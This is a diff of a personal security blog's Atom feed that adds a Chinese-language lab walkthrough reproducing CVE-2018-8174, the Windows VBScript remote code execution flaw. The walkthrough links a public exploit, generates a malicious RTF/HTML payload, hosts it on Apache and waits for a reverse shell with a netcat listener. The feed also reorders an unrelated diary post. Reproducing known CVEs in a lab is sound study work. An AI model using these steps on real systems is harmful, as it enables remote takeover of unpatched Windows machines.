@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://threst.github.io/"/>
-  <updated>2018-08-28T03:32:30.290Z</updated>
+  <updated>2018-09-09T05:41:27.091Z</updated>
   <id>https://threst.github.io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>双杀0day漏洞(CVE-2018-8174)复现</title>
+    <link href="https://threst.github.io/2018/09/09/%E5%8F%8C%E6%9D%800day%E6%BC%8F%E6%B4%9E(CVE-2018-8174)%E5%A4%8D%E7%8E%B0/"/>
+    <id>https://threst.github.io/2018/09/09/双杀0day漏洞(CVE-2018-8174)复现/</id>
+    <published>2018-09-09T14:13:14.000Z</published>
+    <updated>2018-09-09T05:41:27.091Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h2><p>CVE-2018-8174 是 Windows VBScript Engine 代码执行漏洞。<br>微软在4月20日早上确认此漏洞，并于5月8号发布了官方安全补丁，对该 0day 漏洞进行了修复，将其命名为 CVE-2018-8174<br>由于 VBScript 脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码。</p><h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>攻击机 IP：192.168.1.101<br>靶机 IP：192.168.1.111</p><p>github:<a href="https://github.com/Yt1g3r/CVE-2018-8174_EXP" target="_blank" rel="noopener">https://github.com/Yt1g3r/CVE-2018-8174_EXP</a></p><h2 id="0x01-生成payload"><a href="#0x01-生成payload" class="headerlink" title="0x01 生成payload"></a>0x01 生成payload</h2><p><code>python CVE-2018-8174.py -u http://192.168.1.101/ -o exp.rtf -i 192.168.1.101 -p 4444</code></p><p><code>-u</code>:url地址<br><code>-o</code>: 输出文件<br><code>-i</code>：监听地址<br><code>-p</code>：监听端口</p><h2 id="0x02-测试"><a href="#0x02-测试" class="headerlink" title="0x02 测试"></a>0x02 测试</h2><p>把 explot.html 复制到 /var/www/html/，并开启 apache 服务</p><p><code>sudo cp exploit.html /var/www/html/</code></p><p>开启Apache服务<br><code>sudo service  apache2 start</code></p><p>攻击机监听端口<br><code>nc -lvvp 4444</code></p><p>靶机使用IE打开URL<br><code>http://192.168.1.101/exploit.html</code></p><p>靶机打开生成的Word文档也是一样的，可是我没测试成功</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;漏洞描述：&quot;&gt;&lt;a href=&quot;#漏洞描述：&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述：&quot;&gt;&lt;/a&gt;漏洞描述：&lt;/h2&gt;&lt;p&gt;CVE-2018-8174 是 Windows VBScript Engine 代码执行漏洞。&lt;br&gt;微软在4月20
+      
+    
+    </summary>
+    
+    
+      <category term="CVE-2018-8174" scheme="https://threst.github.io/tags/CVE-2018-8174/"/>
+    
+  </entry>
   
   <entry>
     <title>ctf之隱寫術</title>
@@ -87,29 +110,6 @@
   </entry>
   
   <entry>
-    <title>61随想</title>
-    <link href="https://threst.github.io/2018/06/01/61%E9%9A%8F%E6%83%B3/"/>
-    <id>https://threst.github.io/2018/06/01/61随想/</id>
-    <published>2018-06-01T14:13:14.000Z</published>
-    <updated>2018-06-01T14:58:02.906Z</updated>
-    
-    <content type="html"><![CDATA[<p>今天是国际儿童节,可能每个人心里都住着一个孩子,动态朋友圈都是关于61礼物的,连室友都回长沙陪女朋友了,我就不一样了,买的内存和电脑都到了,装上之后确实不一样了,可以愉快的开虚拟机了!!其实今天还是大四的毕业晚会,想想三年之后就是我们了,现在还是这么菜,每天还是CTAL+V,还是要多看书,又想起高三的生活,转眼一年过去了,根据朋友圈的动态来分析,他们过的都还好,离2018高考也只有6天了,一起加油吧!<br><img src="https://i.loli.net/2018/06/01/5b115eb53507e.jpg" alt=""></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;今天是国际儿童节,可能每个人心里都住着一个孩子,动态朋友圈都是关于61礼物的,连室友都回长沙陪女朋友了,我就不一样了,买的内存和电脑都到了,装上之后确实不一样了,可以愉快的开虚拟机了!!其实今天还是大四的毕业晚会,想想三年之后就是我们了,现在还是这么菜,每天还是CTAL+V
-      
-    
-    </summary>
-    
-    
-      <category term="瞎记罢写" scheme="https://threst.github.io/tags/%E7%9E%8E%E8%AE%B0%E7%BD%A2%E5%86%99/"/>
-    
-  </entry>
-  
-  <entry>
     <title>常见文件格式分析</title>
     <link href="https://threst.github.io/2018/06/01/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/"/>
     <id>https://threst.github.io/2018/06/01/常见文件格式分析/</id>
@@ -129,6 +129,29 @@
     
     
       <category term="ctf" scheme="https://threst.github.io/tags/ctf/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>61随想</title>
+    <link href="https://threst.github.io/2018/06/01/61%E9%9A%8F%E6%83%B3/"/>
+    <id>https://threst.github.io/2018/06/01/61随想/</id>
+    <published>2018-06-01T14:13:14.000Z</published>
+    <updated>2018-06-01T14:58:02.906Z</updated>
+    
+    <content type="html"><![CDATA[<p>今天是国际儿童节,可能每个人心里都住着一个孩子,动态朋友圈都是关于61礼物的,连室友都回长沙陪女朋友了,我就不一样了,买的内存和电脑都到了,装上之后确实不一样了,可以愉快的开虚拟机了!!其实今天还是大四的毕业晚会,想想三年之后就是我们了,现在还是这么菜,每天还是CTAL+V,还是要多看书,又想起高三的生活,转眼一年过去了,根据朋友圈的动态来分析,他们过的都还好,离2018高考也只有6天了,一起加油吧!<br><img src="https://i.loli.net/2018/06/01/5b115eb53507e.jpg" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;今天是国际儿童节,可能每个人心里都住着一个孩子,动态朋友圈都是关于61礼物的,连室友都回长沙陪女朋友了,我就不一样了,买的内存和电脑都到了,装上之后确实不一样了,可以愉快的开虚拟机了!!其实今天还是大四的毕业晚会,想想三年之后就是我们了,现在还是这么菜,每天还是CTAL+V
+      
+    
+    </summary>
+    
+    
+      <category term="瞎记罢写" scheme="https://threst.github.io/tags/%E7%9E%8E%E8%AE%B0%E7%BD%A2%E5%86%99/"/>
     
   </entry>
   
